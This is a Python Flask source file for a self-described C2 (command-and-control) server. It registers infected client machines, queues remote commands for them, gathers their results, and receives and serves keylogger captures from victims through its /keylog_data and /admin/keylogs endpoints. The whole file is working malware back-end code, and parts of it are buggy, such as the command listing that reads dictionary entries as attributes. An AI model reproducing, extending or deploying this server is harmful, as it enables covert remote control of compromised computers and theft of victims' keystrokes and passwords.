from flask import Flask, request, jsonify
import time
import threading
from datetime import datetime
import os
from config import ENCRYPTION_KEY
from encryptor import Encryptor
from protocol import Protocol


app = Flask(__name__)

# In-memory storage
clients = {}
pending_commands = {}
command_results = {}
keylogs_storage = {}

encryptor = Encryptor(ENCRYPTION_KEY)


@app.route('/')
def home():
    return "C2 Server Online - " + datetime.now().isoformat()


@app.route('/register', methods=['POST'])
def register_client():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            error_msg = Protocol.create_error_message("No encrypted data provided!")

            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        client_data = encryptor.decrypt(encrypted_data)
        if not client_data:
            error_msg = Protocol.create_error_message("Decryption failed")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        if client_data.get("type") != Protocol.MSG_REGISTER:
            error_msg = Protocol.create_error_message("Invalid message type for registration")

            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        client_id = client_data.get("client_id")
        system_info = client_data.get("system_info", {})

        if not client_id:
            error_msg = Protocol.create_error_message("No client id in message")
            encrypted_res = encryptor.encrypt(error_msg)
            
            return jsonify({
                "data": encrypted_res
            }), 400
        

        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        # Save to memory
        clients[client_id] = {
            'client_id': client_id,
            'system_info': system_info,
            'ip': client_ip,
            'last_seen': time.time(),
            'registered_at': time.time()
        }
        
        print(f"[+] Client registered: {client_id} from {client_ip}")

        response_data = Protocol.create_success_message("Registered successfully!!!")
        encrypted_response = encryptor.encrypt(response_data)

        return jsonify({"data": encrypted_response})
    

    except Exception as e:
        print(f"REGISTRATION ERROR: {e}")
        error_msg = Protocol.create_error_message(str(e))
        error_res = encryptor.encrypt(error_msg)

        return jsonify({
            "data": error_res
        }), 500


@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            error_msg = Protocol.create_error_message("No encrypted data")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400



        heartbeat_data = encryptor.decrypt(encrypted_data)
        if not heartbeat_data:
            error_msg = Protocol.create_error_message("Decryption failed!")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400

        if heartbeat_data.get("type") != Protocol.MSG_HEARTBEAT:
            error_msg = Protocol.create_error_message("Invalid message type for heartbeat")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400



        client_id = heartbeat_data.get('client_id')

        if client_id:
            # Update heartbeat in memory
            if client_id in clients:
                clients[client_id]['last_seen'] = time.time()
                res_msg = Protocol.create_success_message()
                encrypted_response = encryptor.encrypt(res_msg)
                return jsonify({
                    "data": encrypted_response
                })
            else:
                error_msg = Protocol.create_error_message("Client not found!")
                encrypted_response = encryptor.encrypt(error_msg)
                return jsonify({
                    "data": encrypted_response,
                }), 404
        else:
            error_msg = Protocol.create_error_message("No client_id provided!")
            encrypted_response = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_response,
            }), 400
    
    except Exception as e:
        error_msg = Protocol.create_error_message(str(e))
        encrypted_res = encryptor.encrypt(error_msg)

        return jsonify({
            "data": encrypted_res
        }), 500


@app.route('/admin/clients', methods=['GET'])
def get_clients():
    #Get list of all connected clients from memory
    clients_list = list(clients.values())
    
    # Add uptime calculation
    current_time = time.time()
    for client in clients_list:
        if client.get('registered_at'):
            client['uptime_seconds'] = current_time - client['registered_at']
        else:
            client['uptime_seconds'] = 0
    
    print(f"[ADMIN] Returning {len(clients_list)} clients")
    return jsonify({
        "status": "success",
        "clients": clients_list,
        "total_clients": len(clients_list),
        "server_time": datetime.now().isoformat()
    })


@app.route('/admin/status', methods=['GET'])
def server_status():
    current_time = time.time()
    online_clients = sum(1 for c in clients.values() if current_time - c.get('last_seen', 0) < 60)
    
    return jsonify({
        "status": "online",
        "total_clients": len(clients),
        "online_clients": online_clients,
        "total_commands": len(pending_commands) + len(command_results),
        "pending_commands": sum(len(cmds) for cmds in pending_commands.values()),
        "server_time": datetime.now().isoformat(),
        "uptime_seconds": time.time() - app.start_time
    })




@app.route("/admin/process/<client_id>", methods=['POST'])
def send_process_command(client_id):
    try:
        command_data = request.json
        action = command_data.get("action")
        data = command_data.get("data", {})
        
        if not action:
            return jsonify({"error": "No action specified"}), 400
        
        command_id = f'cmd_{int(time.time() * 1000)}'
        
        # Save command to database
        if client_id not in pending_commands:
            pending_commands[client_id] = []
        pending_commands[client_id].append({
            'command_id': command_id,
            'action': action,
            'data': data
        })
        
        print(f"[PROCESS] Command queued for {client_id}: {action}")
        return jsonify({
            "success": True,
            "command_id": command_id,
            "message": f'Command queued for client {client_id}'
        })
    
    except Exception as e:
        return jsonify({"error": f"failed to queue command: {e}"}), 500
    


@app.route("/admin/command_result/<command_id>", methods=['GET'])
def get_command_result(command_id):
    try:
        result = command_results.get(command_id)
        if result and result.get('status') == 'completed':
            return jsonify({"success": True, "result": result.get('result')})
        else:
            return jsonify({"error": "Result not found or not yet completed"}), 404
    
    except Exception as e:
        return jsonify({"error": f'Failed to get result: {e}'}), 500


@app.route("/commands", methods=["POST"])
def get_commands():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            return jsonify({"error": "No encrypted data"}), 400
        
        
        client_data = encryptor.decrypt(encrypted_data)
        if not client_data or client_data.get("type") != Protocol.MSG_GET_COMMANDS:
            return jsonify({"error": "Invalid request"}), 400
        
        client_id = client_data.get("client_id")
        if not client_id:
            return jsonify({"error": "No client ID"}), 400
        
        
        print(f"[SERVER] Client {client_id} requesting commands")
        
        # Get pending commands from database
        commands_obj = pending_commands.get(client_id, [])
        commands = [{
            "command_id": cmd.command_id,
            "action": cmd.action,
            "data": cmd.data,
            "timestamp": cmd.created_at.timestamp() if cmd.created_at else time.time()
        } for cmd in commands_obj]
        
        print(f"[SERVER] Found {len(commands)} pending commands for {client_id}")
        print(f"[SERVER] Sending {len(commands)} commands to {client_id}")
        
        
        response_data = {
            "type": "commands",
            "commands": commands
        }
        
        
        encrypted_response = encryptor.encrypt(response_data)
        return jsonify({"data": encrypted_response})
    
    
    except Exception as e:
        print(f"[SERVER] Error in /commands: {e}")
        return jsonify({"error": f"Failed to get commands: {e}"}), 500
    
    


@app.route("/commands_result", methods=["POST"])
def submit_command_result():
    try:
        print(f"[SERVER] Received command result request")
        encrypted_data = request.json.get("data")
        if not encrypted_data:
            print(f"[SERVER] Error: No encrypted data in command result")
            return jsonify({"error": "No encrypted data"}), 400
        
        print(f"[SERVER] Decrypting command result...")
        client_data = encryptor.decrypt(encrypted_data)
        if not client_data:
            print(f"[SERVER] Error: Failed to decrypt command result")
            return jsonify({"error": "Decryption failed"}), 400
            
        print(f"[SERVER] Decrypted data type: {type(client_data)}")

        if not isinstance(client_data, dict) or client_data.get("type") != "command_result":
            print(f"[SERVER] Error: Invalid message format or type: {type(client_data)}")
            return jsonify({"error": "Invalid request format"}), 400
        
        command_id = client_data.get("command_id")
        result = client_data.get("result")
        
        print(f"[SERVER] Command ID: {command_id}, Result type: {type(result)}")
        
        if command_id and result is not None:
            # Update command result in database
            command_results[command_id] = result
            # Retirer de pending
            for cid in pending_commands:
                pending_commands[cid] = [c for c in pending_commands[cid] if c['command_id'] != command_id]
            if True:
                print(f"[SERVER] Successfully stored result for command {command_id}")
                return jsonify({"success" : True})
            else:
                print(f"[SERVER] Error: Command {command_id} not found")
                return jsonify({"error": "Command not found"}), 404
        else:
            print(f"[SERVER] Error: Missing command_id or result")
            return jsonify({"error": "Missing command_id or result"}), 400
    
    except Exception as e:
        print(f"[SERVER] Error in /commands_result: {e}")
        import traceback
        print(f"[SERVER] Traceback: {traceback.format_exc()}")
        return jsonify({"error": f"Failed to submit result: {e}"}), 500


@app.route("/keylog_data", methods=["POST"])
def receive_keylog_data():
    
    try:
        print(f"[KEYLOG] Received keylog data request")
        encrypted_data = request.json.get("data")
        if not encrypted_data:
            print(f"[KEYLOG] Error: No encrypted data")
            return jsonify({"error": "No encrypted data"}), 400
        
        print(f"[KEYLOG] Decrypting keylog data...")
        keylog_data = encryptor.decrypt(encrypted_data)
        if not keylog_data:
            print(f"[KEYLOG] Error: Failed to decrypt keylog data")
            return jsonify({"error": "Decryption failed"}), 400
            
        print(f"[KEYLOG] Decrypted data type: {keylog_data.get('type')}")

        # Vérifier que c'est bien des keylogs
        if not isinstance(keylog_data, dict) or keylog_data.get("type") != "keylog_data":
            print(f"[KEYLOG] Error: Invalid message type: {keylog_data.get('type')}")
            return jsonify({"error": "Invalid keylog data format"}), 400
        
        client_id = keylog_data.get("client_id")
        logs = keylog_data.get("logs", [])
        log_count = keylog_data.get("log_count", 0)
        
        print(f"[KEYLOG] Client: {client_id}, Logs count: {log_count}")
        
        if client_id and logs:
            # Save to memory
            if client_id not in keylogs_storage:
                keylogs_storage[client_id] = []
            keylogs_storage[client_id].extend(logs)
            # Limiter à 1000 logs par client
            keylogs_storage[client_id] = keylogs_storage[client_id][-1000:]
            
            # Update client last_seen
            if client_id in clients:
                clients[client_id]['last_seen'] = time.time()
            
            total_logs = len(keylogs_storage[client_id])
            
            print(f"[KEYLOG] ✅ Successfully stored {len(logs)} keylogs for client {client_id}")
            print(f"[KEYLOG] Total logs for {client_id}: {total_logs}")
            
            return jsonify({
                "success": True, 
                "message": f"Received {len(logs)} keylogs",
                "total_stored": total_logs
            })
        else:
            print(f"[KEYLOG] Error: Missing client_id or logs")
            return jsonify({"error": "Missing client_id or logs"}), 400
    
    except Exception as e:
        print(f"[KEYLOG] Error in /keylog_data: {e}")
        import traceback
        print(f"[KEYLOG] Traceback: {traceback.format_exc()}")
        return jsonify({"error": f"Failed to process keylogs: {e}"}), 500


@app.route("/admin/keylogs/<client_id>", methods=["GET"])
def get_client_keylogs(client_id):
    
    try:
        limit = request.args.get('limit', 100, type=int)
        
        # Get keylogs from database
        logs = keylogs_storage.get(client_id, [])[-limit:]
        total_count = len(keylogs_storage.get(client_id, []))
        
        return jsonify({
            "success": True,
            "client_id": client_id,
            "keylogs": logs,
            "total_logs": total_count,
            "returned_logs": len(logs)
        })
    
    except Exception as e:
        print(f"[ADMIN_KEYLOG] Error getting keylogs for {client_id}: {e}")
        return jsonify({"error": f"Failed to get keylogs: {e}"}), 500
    

@app.route("/admin/keylogs_stats", methods=["GET"])
def get_keylogs_stats():
    
    try:
        clients_with_logs = []
        
        clients_list = list(clients.values())
        total_logs = 0
        
        for client in clients_list:
            client_id = client['client_id']
            log_count = len(keylogs_storage.get(client_id, []))
            
            if log_count > 0:
                # Get last log timestamp
                logs_list = keylogs_storage.get(client_id, [])
                last_log_time = logs_list[-1].get('timestamp', 'Unknown') if logs_list else "No logs"
                
                clients_with_logs.append({
                    "client_id": client_id,
                    "log_count": log_count,
                    "last_log_time": last_log_time,
                    "client_online": (time.time() - client.get('last_seen', 0)) < 60
                })
                total_logs += log_count
        
        return jsonify({
            "success": True,
            "total_clients_with_logs": len(clients_with_logs),
            "total_logs_stored": total_logs,
            "clients": clients_with_logs
        })
    
    except Exception as e:
        return jsonify({"error": f"Failed to get keylog stats: {e}"}), 500


# New admin routes for database insights
@app.before_request
def before_request():
    online_count = sum(1 for c in clients.values() if time.time() - c.get('last_seen', 0) < 60)
    print(f"[REQUEST] {request.method} {request.path} - Online: {online_count}/{len(clients)}")

@app.after_request
def after_request(response):
    print(f"[RESPONSE] {request.method} {request.path} - Status: {response.status_code}")
    return response



#Store server start time
app.start_time = time.time()



if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"[SERVER] Starting C2 server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)